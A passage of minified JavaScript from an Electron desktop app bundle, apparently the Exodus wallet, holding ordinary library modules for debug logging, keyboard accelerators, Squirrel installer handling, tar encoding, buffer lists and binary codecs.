			if (t >= i) return Math.round(e / i) + "d";
			if (t >= o) return Math.round(e / o) + "h";
			if (t >= r) return Math.round(e / r) + "m";
			if (t >= n) return Math.round(e / n) + "s";
			return e + "ms"
		}(e);
		throw new Error("val is not a non-empty string or a valid number. val=" + JSON.stringify(e))
	}
}, function(e, t, n) {
	t.formatArgs = function(t) {
		if (t[0] = (this.useColors ? "%c" : "") + this.namespace + (this.useColors ? " %c" : " ") + t[0] + (this.useColors ? "%c " : " ") + "+" + e.exports.humanize(this.diff), !this.useColors) return;
		const n = "color: " + this.color;
		t.splice(1, 0, n, "color: inherit");
		let r = 0,
			o = 0;
		t[0].replace(/%[a-zA-Z%]/g, e => {
			"%%" !== e && (r++, "%c" === e && (o = r))
		}), t.splice(o, 0, n)
	}, t.save = function(e) {
		try {
			e ? t.storage.setItem("debug", e) : t.storage.removeItem("debug")
		} catch (e) {}
	}, t.load = function() {
		let e;
		try {
			e = t.storage.getItem("debug")
		} catch (e) {}!e && "env" in process && (e = process.env.DEBUG);
		return e
	}, t.useColors = function() {
		0;
		if ("undefined" != typeof navigator && navigator.userAgent && navigator.userAgent.toLowerCase().match(/(edge|trident)\/(\d+)/)) return !1;
		return "undefined" != typeof document && document.documentElement && document.documentElement.style && document.documentElement.style.WebkitAppearance || "undefined" != typeof navigator && navigator.userAgent && navigator.userAgent.toLowerCase().match(/firefox\/(\d+)/) && parseInt(RegExp.$1, 10) >= 31 || "undefined" != typeof navigator && navigator.userAgent && navigator.userAgent.toLowerCase().match(/applewebkit\/(\d+)/)
	}, t.storage = function() {
		try {
			return localStorage
		} catch (e) {}
	}(), t.destroy = (() => {
		let e = !1;
		return () => {
			e || (e = !0, console.warn("Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`."))
		}
	})(), t.colors = ["#0000CC", "#0000FF", "#0033CC", "#0033FF", "#0066CC", "#0066FF", "#0099CC", "#0099FF", "#00CC00", "#00CC33", "#00CC66", "#00CC99", "#00CCCC", "#00CCFF", "#3300CC", "#3300FF", "#3333CC", "#3333FF", "#3366CC", "#3366FF", "#3399CC", "#3399FF", "#33CC00", "#33CC33", "#33CC66", "#33CC99", "#33CCCC", "#33CCFF", "#6600CC", "#6600FF", "#6633CC", "#6633FF", "#66CC00", "#66CC33", "#9900CC", "#9900FF", "#9933CC", "#9933FF", "#99CC00", "#99CC33", "#CC0000", "#CC0033", "#CC0066", "#CC0099", "#CC00CC", "#CC00FF", "#CC3300", "#CC3333", "#CC3366", "#CC3399", "#CC33CC", "#CC33FF", "#CC6600", "#CC6633", "#CC9900", "#CC9933", "#CCCC00", "#CCCC33", "#FF0000", "#FF0033", "#FF0066", "#FF0099", "#FF00CC", "#FF00FF", "#FF3300", "#FF3333", "#FF3366", "#FF3399", "#FF33CC", "#FF33FF", "#FF6600", "#FF6633", "#FF9900", "#FF9933", "#FFCC00", "#FFCC33"], t.log = console.debug || console.log || (() => {}), e.exports = n(69)(t);
	const {
		formatters: r
	} = e.exports;
	r.j = function(e) {
		try {
			return JSON.stringify(e)
		} catch (e) {
			return "[UnexpectedJSONParseError]: " + e.message
		}
	}
}, function(e, t, n) {
	!0 === process.browser || process.__nwjs ? e.exports = n(96) : e.exports = n(94)
}, function(e, t) {
	const n = /^(CommandOrControl|CmdOrCtrl|Command|Cmd|Control|Ctrl|AltGr|Option|Alt|Shift|Super)/i,
		r = /^(Plus|Space|Tab|Backspace|Delete|Insert|Return|Enter|Up|Down|Left|Right|Home|End|PageUp|PageDown|Escape|Esc|VolumeUp|VolumeDown|VolumeMute|MediaNextTrack|MediaPreviousTrack|MediaStop|MediaPlayPause|PrintScreen|F24|F23|F22|F21|F20|F19|F18|F17|F16|F15|F14|F13|F12|F11|F10|F9|F8|F7|F6|F5|F4|F3|F2|F1|[0-9A-Z)!@#$%^&*(:+<_>?~{|}";=,\-./`[\\\]'])/i,
		o = {};

	function i({
		accelerator: e,
		event: t
	}, n) {
		switch (n) {
			case "command":
			case "cmd":
				return function(e, t, n) {
					if ("darwin" !== process.platform) return o;
					if (t.metaKey) throw new Error("Double `Command` modifier specified.");
					return {
						event: Object.assign({}, t, {
							metaKey: !0
						}),
						accelerator: e.slice(n.length)
					}
				}(e, t, n);
			case "super":
				return function(e, t, n) {
					if (t.metaKey) throw new Error("Double `Super` modifier specified.");
					return {
						event: Object.assign({}, t, {
							metaKey: !0
						}),
						accelerator: e.slice(n.length)
					}
				}(e, t, n);
			case "control":
			case "ctrl":
				return function(e, t, n) {
					if (t.ctrlKey) throw new Error("Double `Control` modifier specified.");
					return {
						event: Object.assign({}, t, {
							ctrlKey: !0
						}),
						accelerator: e.slice(n.length)
					}
				}(e, t, n);
			case "commandorcontrol":
			case "cmdorctrl":
				return function(e, t, n) {
					if ("darwin" === process.platform) {
						if (t.metaKey) throw new Error("Double `Command` modifier specified.");
						return {
							event: Object.assign({}, t, {
								metaKey: !0
							}),
							accelerator: e.slice(n.length)
						}
					}
					if (t.ctrlKey) throw new Error("Double `Control` modifier specified.");
					return {
						event: Object.assign({}, t, {
							ctrlKey: !0
						}),
						accelerator: e.slice(n.length)
					}
				}(e, t, n);
			case "option":
			case "altgr":
			case "alt":
				return function(e, t, n) {
					if ("option" === n && "darwin" !== process.platform) return o;
					if (t.altKey) throw new Error("Double `Alt` modifier specified.");
					return {
						event: Object.assign({}, t, {
							altKey: !0
						}),
						accelerator: e.slice(n.length)
					}
				}(e, t, n);
			case "shift":
				return function(e, t, n) {
					if (t.shiftKey) throw new Error("Double `Shift` modifier specified.");
					return {
						event: Object.assign({}, t, {
							shiftKey: !0
						}),
						accelerator: e.slice(n.length)
					}
				}(e, t, n);
			default:
				console.error(n)
		}
	}

	function s({
		accelerator: e,
		event: t
	}) {
		return {
			event: t,
			accelerator: e.trim().slice(1)
		}
	}
	const c = {
		0: "Digit0",
		1: "Digit1",
		2: "Digit2",
		3: "Digit3",
		4: "Digit4",
		5: "Digit5",
		6: "Digit6",
		7: "Digit7",
		8: "Digit8",
		9: "Digit9",
		"-": "Minus",
		"=": "Equal",
		Q: "KeyQ",
		W: "KeyW",
		E: "KeyE",
		R: "KeyR",
		T: "KeyT",
		Y: "KeyY",
		U: "KeyU",
		I: "KeyI",
		O: "KeyO",
		P: "KeyP",
		"[": "BracketLeft",
		"]": "BracketRight",
		A: "KeyA",
		S: "KeyS",
		D: "KeyD",
		F: "KeyF",
		G: "KeyG",
		H: "KeyH",
		J: "KeyJ",
		K: "KeyK",
		L: "KeyL",
		";": "Semicolon",
		"'": "Quote",
		"`": "Backquote",
		"/": "Backslash",
		Z: "KeyZ",
		X: "KeyX",
		C: "KeyC",
		V: "KeyV",
		B: "KeyB",
		N: "KeyN",
		M: "KeyM",
		",": "Comma",
		".": "Period",
		"\\": "Slash",
		" ": "Space"
	};

	function a({
		accelerator: e,
		event: t
	}, n) {
		if (n.length > 1 || t.key) throw new Error(`Unvalid keycode \`${n}\`.`);
		const r = n.toUpperCase() in c ? c[n.toUpperCase()] : null;
		return {
			event: Object.assign({}, t, {
				key: n
			}, r ? {
				code: r
			} : null),
			accelerator: e.trim().slice(n.length)
		}
	}
	const u = Object.assign(Object.create(null), {
		plus: "Add",
		space: "Space",
		tab: "Tab",
		backspace: "Backspace",
		delete: "Delete",
		insert: "Insert",
		return: "Return",
		enter: "Return",
		up: "ArrowUp",
		down: "ArrowDown",
		left: "ArrowLeft",
		right: "ArrowRight",
		home: "Home",
		end: "End",
		pageup: "PageUp",
		pagedown: "PageDown",
		escape: "Escape",
		esc: "Escape",
		volumeup: "AudioVolumeUp",
		volumedown: "AudioVolumeDown",
		volumemute: "AudioVolumeMute",
		medianexttrack: "MediaTrackNext",
		mediaprevioustrack: "MediaTrackPrevious",
		mediastop: "MediaStop",
		mediaplaypause: "MediaPlayPause",
		printscreen: "PrintScreen"
	});
	for (let e = 1; e <= 24; e++) u[`f${e}`] = `F${e}`;

	function l({
		accelerator: e,
		event: t
	}, {
		code: n,
		key: r
	}) {
		if (t.code) throw new Error(`Duplicated keycode \`${r}\`.`);
		return {
			event: Object.assign({}, t, {
				key: r
			}, n ? {
				code: n
			} : null),
			accelerator: e.trim().slice(r && r.length || 0)
		}
	}
	e.exports = {
		UNSUPPORTED: o,
		reduceModifier: i,
		reducePlus: s,
		reduceKey: a,
		reduceCode: l,
		toKeyEvent: function(e) {
			let t = {
				accelerator: e,
				event: {}
			};
			for (;
				"" !== t.accelerator;) {
				const e = t.accelerator.match(n);
				if (e) {
					if ((t = i(t, e[0].toLowerCase())) === o) return {
						unsupportedKeyForPlatform: !0
					}
				} else if ("+" === t.accelerator.trim()[0]) t = s(t);
				else {
					const e = t.accelerator.match(r);
					if (!e) throw new Error(`Unvalid accelerator: "${t.accelerator}"`); {
						const n = e[0].toLowerCase();
						t = n in u ? l(t, {
							code: u[n],
							key: n
						}) : a(t, n)
					}
				}
			}
			return t.event
		}
	}
}, function(e, t, n) {
	"use strict";

	function r(e) {
		return "string" != typeof e ? e : e.toLowerCase()
	}
	e.exports = function(e, t) {
		if (e === t) return !0;
		for (const n of ["altKey", "ctrlKey", "shiftKey", "metaKey"]) {
			const [r, o] = [e[n], t[n]];
			if (Boolean(r) !== Boolean(o)) return !1
		}
		return r(e.key) === r(t.key) && void 0 !== e.key || e.code === t.code && void 0 !== e.code
	}
}, function(e, t, n) {
	"use strict";
	const r = /^(Command|Cmd|Control|Ctrl|CommandOrControl|CmdOrCtrl|Alt|Option|AltGr|Shift|Super)$/,
		o = /^([0-9A-Z)!@#$%^&*(:+<_>?~{|}";=,\-./`[\\\]']|F1*[1-9]|F10|F2[0-4]|Plus|Space|Tab|Backspace|Delete|Insert|Return|Enter|Up|Down|Left|Right|Home|End|PageUp|PageDown|Escape|Esc|VolumeUp|VolumeDown|VolumeMute|MediaNextTrack|MediaPreviousTrack|MediaStop|MediaPlayPause|PrintScreen)$/;
	e.exports = function(e) {
		let t = e.split("+"),
			n = !1;
		return t.every((e, i) => {
			const s = o.test(e),
				c = r.test(e);
			if (s) {
				if (n) return !1;
				n = !0
			}
			return !(i === t.length - 1 && !n) && (s || c)
		})
	}
}, function(e, t, n) {
	"use strict";
	n.r(t), n.d(t, "handleCommand", function() {
		return l
	});
	var r = n(56),
		o = n(0),
		i = n(1),
		s = n.n(i),
		c = n(2),
		a = n(46);

	function u(e, t) {
		const n = s.a.resolve(s.a.dirname(process.execPath), "..", "Update.exe");
		Object(r.spawn)(n, e, {
			detached: !0
		}).on("close", t)
	}

	function l(e) {
		const t = s.a.basename(process.execPath);
		if ("--squirrel-install" === e || "--squirrel-updated" === e) return u([`--createShortcut=${t}`], () => {
			Object(a.b)(), setTimeout(() => o.app.quit(), 3e3)
		}), !0;
		if ("--squirrel-uninstall" === e) return Object(a.a)(), u([`--removeShortcut=${t}`], o.app.quit.bind(o.app)), !0;
		if ("--squirrel-obsolete" === e) return o.app.quit(), !0;
		if ("--squirrel-firstrun" === e) {
			const e = (() => c.c ? "Exodus" : c.b ? "ExodusEden" : c.d)(),
				t = {
					type: "info",
					buttons: ["OK"],
					title: `${e} Installed`,
					message: `${e} has been installed! You can run it by clicking the shortcut on your desktop or in the app menu.`,
					noLink: !1
				};
			return o.app.on("ready", () => {
				o.dialog.showMessageBoxSync(null, t), o.app.quit()
			}), !0
		}
		return !1
	}
}, function(e, t, n) {
	"use strict";
	n.r(t);
	var r = n(46);
	(() => {
		if ("win32" === process.platform) {
			return !n(101).handleCommand(process.argv[1])
		}
		return Object(r.b)(), !0
	})() && n(91)
}, function(e, t) {
	var n = Buffer.alloc,
		r = "0".charCodeAt(0),
		o = Buffer.from("ustar\0", "binary"),
		i = Buffer.from("00", "binary"),
		s = Buffer.from("ustar ", "binary"),
		c = Buffer.from(" \0", "binary"),
		a = parseInt("7777", 8),
		u = function(e, t, n, r) {
			for (; n < r; n++)
				if (e[n] === t) return n;
			return r
		},
		l = function(e) {
			for (var t = 256, n = 0; n < 148; n++) t += e[n];
			for (var r = 156; r < 512; r++) t += e[r];
			return t
		},
		f = function(e, t) {
			return (e = e.toString(8)).length > t ? "7777777777777777777".slice(0, t) + " " : "0000000000000000000".slice(0, t - e.length) + e + " "
		};
	var d = function(e, t, n) {
			if (128 & (e = e.slice(t, t + n))[t = 0]) return function(e) {
				var t;
				if (128 === e[0]) t = !0;
				else {
					if (255 !== e[0]) return null;
					t = !1
				}
				for (var n = [], r = e.length - 1; r > 0; r--) {
					var o = e[r];
					t ? n.push(o) : n.push(255 - o)
				}
				var i = 0,
					s = n.length;
				for (r = 0; r < s; r++) i += n[r] * Math.pow(256, r);
				return t ? i : -1 * i
			}(e);
			for (; t < e.length && 32 === e[t];) t++;
			for (var r = (o = u(e, 32, t, e.length), i = e.length, s = e.length, "number" != typeof o ? s : (o = ~~o) >= i ? i : o >= 0 ? o : (o += i) >= 0 ? o : 0); t < r && 0 === e[t];) t++;
			return r === t ? 0 : parseInt(e.slice(t, r).toString(), 8);
			var o, i, s
		},
		p = function(e, t, n, r) {
			return e.slice(t, u(e, 0, t, t + n)).toString(r)
		},
		h = function(e) {
			var t = Buffer.byteLength(e),
				n = Math.floor(Math.log(t) / Math.log(10)) + 1;
			return t + n >= Math.pow(10, n) && n++, t + n + e
		};
	t.decodeLongPath = function(e, t) {
		return p(e, 0, e.length, t)
	}, t.encodePax = function(e) {
		var t = "";
		e.name && (t += h(" path=" + e.name + "\n")), e.linkname && (t += h(" linkpath=" + e.linkname + "\n"));
		var n = e.pax;
		if (n)
			for (var r in n) t += h(" " + r + "=" + n[r] + "\n");
		return Buffer.from(t)
	}, t.decodePax = function(e) {
		for (var t = {}; e.length;) {
			for (var n = 0; n < e.length && 32 !== e[n];) n++;
			var r = parseInt(e.slice(0, n).toString(), 10);
			if (!r) return t;
			var o = e.slice(n + 1, r - 1).toString(),
				i = o.indexOf("=");
			if (-1 === i) return t;
			t[o.slice(0, i)] = o.slice(i + 1), e = e.slice(r)
		}
		return t
	}, t.encode = function(e) {
		var t = n(512),
			s = e.name,
			c = "";
		if (5 === e.typeflag && "/" !== s[s.length - 1] && (s += "/"), Buffer.byteLength(s) !== s.length) return null;
		for (; Buffer.byteLength(s) > 100;) {
			var u = s.indexOf("/");
			if (-1 === u) return null;
			c += c ? "/" + s.slice(0, u) : s.slice(0, u), s = s.slice(u + 1)
		}
		return Buffer.byteLength(s) > 100 || Buffer.byteLength(c) > 155 ? null : e.linkname && Buffer.byteLength(e.linkname) > 100 ? null : (t.write(s), t.write(f(e.mode & a, 6), 100), t.write(f(e.uid, 6), 108), t.write(f(e.gid, 6), 116), t.write(f(e.size, 11), 124), t.write(f(e.mtime.getTime() / 1e3 | 0, 11), 136), t[156] = r + function(e) {
			switch (e) {
				case "file":
					return 0;
				case "link":
					return 1;
				case "symlink":
					return 2;
				case "character-device":
					return 3;
				case "block-device":
					return 4;
				case "directory":
					return 5;
				case "fifo":
					return 6;
				case "contiguous-file":
					return 7;
				case "pax-header":
					return 72
			}
			return 0
		}(e.type), e.linkname && t.write(e.linkname, 157), o.copy(t, 257), i.copy(t, 263), e.uname && t.write(e.uname, 265), e.gname && t.write(e.gname, 297), t.write(f(e.devmajor || 0, 6), 329), t.write(f(e.devminor || 0, 6), 337), c && t.write(c, 345), t.write(f(l(t), 6), 148), t)
	}, t.decode = function(e, t) {
		var n = 0 === e[156] ? 0 : e[156] - r,
			i = p(e, 0, 100, t),
			a = d(e, 100, 8),
			u = d(e, 108, 8),
			f = d(e, 116, 8),
			h = d(e, 124, 12),
			y = d(e, 136, 12),
			m = function(e) {
				switch (e) {
					case 0:
						return "file";
					case 1:
						return "link";
					case 2:
						return "symlink";
					case 3:
						return "character-device";
					case 4:
						return "block-device";
					case 5:
						return "directory";
					case 6:
						return "fifo";
					case 7:
						return "contiguous-file";
					case 72:
						return "pax-header";
					case 55:
						return "pax-global-header";
					case 27:
						return "gnu-long-link-path";
					case 28:
					case 30:
						return "gnu-long-path"
				}
				return null
			}(n),
			w = 0 === e[157] ? null : p(e, 157, 100, t),
			b = p(e, 265, 32),
			g = p(e, 297, 32),
			v = d(e, 329, 8),
			E = d(e, 337, 8),
			S = l(e);
		if (256 === S) return null;
		if (S !== d(e, 148, 8)) throw new Error("Invalid tar header. Maybe the tar is corrupted or it needs to be gunzipped?");
		if (0 === o.compare(e, 257, 263)) e[345] && (i = p(e, 345, 155, t) + "/" + i);
		else if (0 !== s.compare(e, 257, 263) || 0 !== c.compare(e, 263, 265)) throw new Error("Invalid tar header: unknown format.");
		return 0 === n && i && "/" === i[i.length - 1] && (n = 5), {
			name: i,
			mode: a,
			uid: u,
			gid: f,
			size: h,
			mtime: new Date(1e3 * y),
			type: m,
			linkname: w,
			uname: b,
			gname: g,
			devmajor: v,
			devminor: E
		}
	}
}, function(e, t) {
	e.exports = require("buffer")
}, function(e, t, n) {
	"use strict";
	const {
		Buffer: Buffer
	} = n(104), r = Symbol.for("BufferList");

	function o(e) {
		if (!(this instanceof o)) return new o(e);
		o._init.call(this, e)
	}
	o._init = function(e) {
			Object.defineProperty(this, r, {
				value: !0
			}), this._bufs = [], this.length = 0, e && this.append(e)
		}, o.prototype._new = function(e) {
			return new o(e)
		}, o.prototype._offset = function(e) {
			if (0 === e) return [0, 0];
			let t = 0;
			for (let n = 0; n < this._bufs.length; n++) {
				const r = t + this._bufs[n].length;
				if (e < r || n === this._bufs.length - 1) return [n, e - t];
				t = r
			}
		}, o.prototype._reverseOffset = function(e) {
			const t = e[0];
			let n = e[1];
			for (let e = 0; e < t; e++) n += this._bufs[e].length;
			return n
		}, o.prototype.get = function(e) {
			if (e > this.length || e < 0) return;
			const t = this._offset(e);
			return this._bufs[t[0]][t[1]]
		}, o.prototype.slice = function(e, t) {
			return "number" == typeof e && e < 0 && (e += this.length), "number" == typeof t && t < 0 && (t += this.length), this.copy(null, 0, e, t)
		}, o.prototype.copy = function(e, t, n, r) {
			if (("number" != typeof n || n < 0) && (n = 0), ("number" != typeof r || r > this.length) && (r = this.length), n >= this.length) return e || Buffer.alloc(0);
			if (r <= 0) return e || Buffer.alloc(0);
			const o = !!e,
				i = this._offset(n),
				s = r - n;
			let c = s,
				a = o && t || 0,
				u = i[1];
			if (0 === n && r === this.length) {
				if (!o) return 1 === this._bufs.length ? this._bufs[0] : Buffer.concat(this._bufs, this.length);
				for (let t = 0; t < this._bufs.length; t++) this._bufs[t].copy(e, a), a += this._bufs[t].length;
				return e
			}
			if (c <= this._bufs[i[0]].length - u) return o ? this._bufs[i[0]].copy(e, t, u, u + c) : this._bufs[i[0]].slice(u, u + c);
			o || (e = Buffer.allocUnsafe(s));
			for (let t = i[0]; t < this._bufs.length; t++) {
				const n = this._bufs[t].length - u;
				if (!(c > n)) {
					this._bufs[t].copy(e, a, u, u + c), a += n;
					break
				}
				this._bufs[t].copy(e, a, u), a += n, c -= n, u && (u = 0)
			}
			return e.length > a ? e.slice(0, a) : e
		}, o.prototype.shallowSlice = function(e, t) {
			if (e = e || 0, t = "number" != typeof t ? this.length : t, e < 0 && (e += this.length), t < 0 && (t += this.length), e === t) return this._new();
			const n = this._offset(e),
				r = this._offset(t),
				o = this._bufs.slice(n[0], r[0] + 1);
			return 0 === r[1] ? o.pop() : o[o.length - 1] = o[o.length - 1].slice(0, r[1]), 0 !== n[1] && (o[0] = o[0].slice(n[1])), this._new(o)
		}, o.prototype.toString = function(e, t, n) {
			return this.slice(t, n).toString(e)
		}, o.prototype.consume = function(e) {
			if (e = Math.trunc(e), Number.isNaN(e) || e <= 0) return this;
			for (; this._bufs.length;) {
				if (!(e >= this._bufs[0].length)) {
					this._bufs[0] = this._bufs[0].slice(e), this.length -= e;
					break
				}
				e -= this._bufs[0].length, this.length -= this._bufs[0].length, this._bufs.shift()
			}
			return this
		}, o.prototype.duplicate = function() {
			const e = this._new();
			for (let t = 0; t < this._bufs.length; t++) e.append(this._bufs[t]);
			return e
		}, o.prototype.append = function(e) {
			if (null == e) return this;
			if (e.buffer) this._appendBuffer(Buffer.from(e.buffer, e.byteOffset, e.byteLength));
			else if (Array.isArray(e))
				for (let t = 0; t < e.length; t++) this.append(e[t]);
			else if (this._isBufferList(e))
				for (let t = 0; t < e._bufs.length; t++) this.append(e._bufs[t]);
			else "number" == typeof e && (e = e.toString()), this._appendBuffer(Buffer.from(e));
			return this
		}, o.prototype._appendBuffer = function(e) {
			this._bufs.push(e), this.length += e.length
		}, o.prototype.indexOf = function(e, t, n) {
			if (void 0 === n && "string" == typeof t && (n = t, t = void 0), "function" == typeof e || Array.isArray(e)) throw new TypeError('The "value" argument must be one of type string, Buffer, BufferList, or Uint8Array.');
			if ("number" == typeof e ? e = Buffer.from([e]) : "string" == typeof e ? e = Buffer.from(e, n) : this._isBufferList(e) ? e = e.slice() : Array.isArray(e.buffer) ? e = Buffer.from(e.buffer, e.byteOffset, e.byteLength) : Buffer.isBuffer(e) || (e = Buffer.from(e)), t = Number(t || 0), isNaN(t) && (t = 0), t < 0 && (t = this.length + t), t < 0 && (t = 0), 0 === e.length) return t > this.length ? this.length : t;
			const r = this._offset(t);
			let o = r[0],
				i = r[1];
			for (; o < this._bufs.length; o++) {
				const t = this._bufs[o];
				for (; i < t.length;) {
					if (t.length - i >= e.length) {
						const n = t.indexOf(e, i);
						if (-1 !== n) return this._reverseOffset([o, n]);
						i = t.length - e.length + 1
					} else {
						const t = this._reverseOffset([o, i]);
						if (this._match(t, e)) return t;
						i++
					}
				}
				i = 0
			}
			return -1
		}, o.prototype._match = function(e, t) {
			if (this.length - e < t.length) return !1;
			for (let n = 0; n < t.length; n++)
				if (this.get(e + n) !== t[n]) return !1;
			return !0
		},
		function() {
			const e = {
				readDoubleBE: 8,
				readDoubleLE: 8,
				readFloatBE: 4,
				readFloatLE: 4,
				readInt32BE: 4,
				readInt32LE: 4,
				readUInt32BE: 4,
				readUInt32LE: 4,
				readInt16BE: 2,
				readInt16LE: 2,
				readUInt16BE: 2,
				readUInt16LE: 2,
				readInt8: 1,
				readUInt8: 1,
				readIntBE: null,
				readIntLE: null,
				readUIntBE: null,
				readUIntLE: null
			};
			for (const t in e) ! function(t) {
				o.prototype[t] = null === e[t] ? function(e, n) {
					return this.slice(e, e + n)[t](0, n)
				} : function(n) {
					return this.slice(n, n + e[t])[t](0)
				}
			}(t)
		}(), o.prototype._isBufferList = function(e) {
			return e instanceof o || o.isBufferList(e)
		}, o.isBufferList = function(e) {
			return null != e && e[r]
		}, e.exports = o
}, function(e, t, n) {
	e.exports = function(e, t) {
		t && (e.super_ = t, e.prototype = Object.create(t.prototype, {
			constructor: {
				value: e,
				enumerable: !1,
				writable: !0,
				configurable: !0
			}
		}))
	}
}, function(e, t, n) {
	try {
		var r = n(32);
		if ("function" != typeof r.inherits) throw "";
		e.exports = r.inherits
	} catch (t) {
		e.exports = n(106)
	}
}, function(e, t, n) {
	"use strict";
	const r = n(57).Duplex,
		o = n(107),
		i = n(105);

	function s(e) {
		if (!(this instanceof s)) return new s(e);
		if ("function" == typeof e) {
			this._callback = e;
			const t = function(e) {
				this._callback && (this._callback(e), this._callback = null)
			}.bind(this);
			this.on("pipe", function(e) {
				e.on("error", t)
			}), this.on("unpipe", function(e) {
				e.removeListener("error", t)
			}), e = null
		}
		i._init.call(this, e), r.call(this)
	}
	o(s, r), Object.assign(s.prototype, i.prototype), s.prototype._new = function(e) {
		return new s(e)
	}, s.prototype._write = function(e, t, n) {
		this._appendBuffer(e), "function" == typeof n && n()
	}, s.prototype._read = function(e) {
		if (!this.length) return this.push(null);
		e = Math.min(e, this.length), this.push(this.slice(0, e)), this.consume(e)
	}, s.prototype.end = function(e) {
		r.prototype.end.call(this, e), this._callback && (this._callback(null, this.slice()), this._callback = null)
	}, s.prototype._destroy = function(e, t) {
		this._bufs.length = 0, this.length = 0, t(e)
	}, s.prototype._isBufferList = function(e) {
		return e instanceof s || e instanceof i || s.isBufferList(e)
	}, s.isBufferList = i.isBufferList, e.exports = s, e.exports.BufferListStream = s, e.exports.BufferList = i
}, function(e, t) {
	e.exports = function(e) {
		const t = (n = "") => {
			const r = e => {
				if (e.includes("!")) throw new Error(`keys cannot contain !; recieved ${e}`);
				return n + e
			};
			return {
				get: async t => e.get(r(t)),
				batchGet: async t => e.batchGet(t.map(e => r(e))),
				set: async (t, n) => e.set(r(t), n),
				batchSet: async t => e.batchSet(Object.fromEntries(Object.entries(t).map(([e, t]) => [r(e), t]))),
				delete: async t => e.delete(r(t)),
				batchDelete: async t => e.batchDelete(t.map(e => r(e))),
				clear: async () => e.clear(n),
				namespace: e => {
					if (e.includes("!")) throw new Error(`prefixes cannot contain !; recieved ${e}`);
					return t(`${n}!${e}!`)
				}
			}
		};
		return t()
	}
}, function(e, t, n) {
	"use strict";
	const r = () => {
			const e = new Error("Delay aborted");
			return e.name = "AbortError", e
		},
		o = ({
			clearTimeout: e,
			setTimeout: t,
			willResolve: n
		}) => (o, {
			value: i,
			signal: s
		} = {}) => {
			if (s && s.aborted) return Promise.reject(r());
			let c, a, u;
			const l = e || clearTimeout,
				f = () => {
					l(c), u(r())
				},
				d = new Promise((e, r) => {
					a = (() => {
						s && s.removeEventListener("abort", f), n ? e(i) : r(i)
					}), u = r, c = (t || setTimeout)(a, o)
				});
			return s && s.addEventListener("abort", f, {
				once: !0
			}), d.clear = (() => {
				l(c), c = null, a()
			}), d
		},
		i = e => {
			const t = o({
				...e,
				willResolve: !0
			});
			return t.reject = o({
				...e,
				willResolve: !1
			}), t.range = ((e, n, r) => t(((e, t) => Math.floor(Math.random() * (t - e + 1) + e))(e, n), r)), t
		},
		s = i();
	s.createWithTimers = i, e.exports = s, e.exports.default = s
}, function(e, t) {
	e.exports = function(e, {
		concurrency: t = 1
	} = {}) {
		! function(e) {
			if (!("number" == typeof e && e > 0) || e !== 1 / 0 && e % 1 != 0) throw new TypeError(`Invalid concurrency value: ${e}`)
		}(t);
		let n = 0;
		const r = [];
		return async function(...o) {
			n += 1;
			try {
				return n > t && await new Promise(e => r.push({
					resolve: e
				})), await e(...o)
			} finally {
				n -= 1, r.length > 0 && r.shift().resolve()
			}
		}
	}
}, function(e, t, n) {
	const r = n(28);
	e.exports = function(e) {
		return {
			expand(t) {
				const n = r.randomBytes(t.length < e - 4 ? e : t.length + 4);
				return n.writeUInt32BE(t.length, 0), t.copy(n, 4, 0), n
			},
			shrink(e) {
				const t = e.readUInt32BE(0);
				return e.slice(4, t + 4)
			}
		}
	}
}, function(e, t, n) {
	"use strict";
	Object.defineProperty(t, "__esModule", {
		value: !0
	}), t.fromUInt32BE = function(e) {
		let t = Buffer.alloc(4);
		return t.writeUInt32BE(e), t
	}
}, function(e, t, n) {
	"use strict";
	Object.defineProperty(t, "__esModule", {
		value: !0
	}), t.struct = void 0, t.decode = d, t.encode = function(e) {
		return f.encode(e)
	}, t.computeChecksum = p, t.checkContents = function(e) {
		let t = d(e);
		return t.checksum.equals(p(t.metadata, t.blob))
	};
	var r, o = n(48),
		i = (r = o) && r.__esModule ? r : {
			default: r
		},
		s = n(113),
		c = function(e) {
			if (e && e.__esModule) return e;
			var t = {};
			if (null != e)
				for (var n in e) Object.prototype.hasOwnProperty.call(e, n) && (t[n] = e[n]);
			return t.default = e, t
		}(n(59)),
		a = n(58),
		u = n(74),
		l = n(71);
	const f = t.struct = (0, i.default)((0, a.vsf)([
		["header", (0, o.Buffer)(u.HEADER_LEN_BYTES)],
		["checksum", (0, o.Buffer)(32)],
		["metadata", (0, o.Buffer)(l.METADATA_LEN_BYTES)],
		["blob", (0, o.VarBuffer)(o.UInt32BE)]
	]));

	function d(e) {
		return f.decode(e)
	}

	function p(e, t) {
		return c.sha256(Buffer.concat([e, (0, s.fromUInt32BE)(t.byteLength), t]))
	}
}, function(e, t, n) {
	"use strict";
	var r = n(35);
	e.exports = function(e, t) {
		if (!r.isAbstractCodec(e)) throw new TypeError("itemType is invalid codec");
		if ("function" != typeof t) throw new TypeError("checkValue must be a function");
		return {
			encode: function n(r, o, i) {
				return t(r), o = e.encode(r, o, i), n.bytes = e.encode.bytes, o
			},
			decode: function n(r, o, i) {
				var s = e.decode(r, o, i);
				return t(s), n.bytes = e.decode.bytes, s
			},
			encodingLength: function(n) {
				return t(n), e.encodingLength(n)
			}
		}
	}
}, function(e, t, n) {
	"use strict";
	var r = n(72),
		o = n(35);
	e.exports = function(e, t) {
		if (!o.isAbstractCodec(e)) throw new TypeError("lengthType is invalid codec");
		var n = r(e);
		return t || (t = "utf8"), {
			encode: function e(r, o, i) {
				if ("string" != typeof r) throw new TypeError("value must be a string");
				return o = n.encode(new Buffer(r, t), o, i), e.bytes = n.encode.bytes, o
			},
			decode: function e(r, o, i) {
				var s = n.decode(r, o, i);
				return e.bytes = n.decode.bytes, s.toString(t)
			},
			encodingLength: function(e) {
				if ("string" != typeof e) throw new TypeError("value must be a string");
				return n.encodingLength(new Buffer(e, t))
			}
		}
	}
}, function(e, t, n) {
	"use strict";
	var r = n(73);
	e.exports = function(e, t) {
		if ("number" != typeof e) throw new TypeError("length must be a number");
		var n = r(e);

		function o(e, r, o) {
			if ("string" != typeof e) throw new TypeError("value must be a string");
			return n.encode(new Buffer(e, t), r, o)
		}

		function i(e, r, o) {
			return n.decode(e, r, o).toString(t)
		}
		return t || (t = "utf-8"), o.bytes = i.bytes = e, {
			encode: o,
			decode: i,
			encodingLength: n.encodingLength
		}
	}
}, function(e, t, n) {
	"use strict";
	var r = n(35);
	e.exports = function(e) {
		if (!Array.isArray(e)) throw new TypeError("types must be an Array instance");

		function t(t) {
			return r.reduce(e, function(e, n, r) {
				return e + n.encodingLength(t[r])
			}, 0)
		}
		return e = e.map(function(e) {
			if (!r.isAbstractCodec(e)) throw new TypeError("types Array has invalid codec");
			return e
		}), {
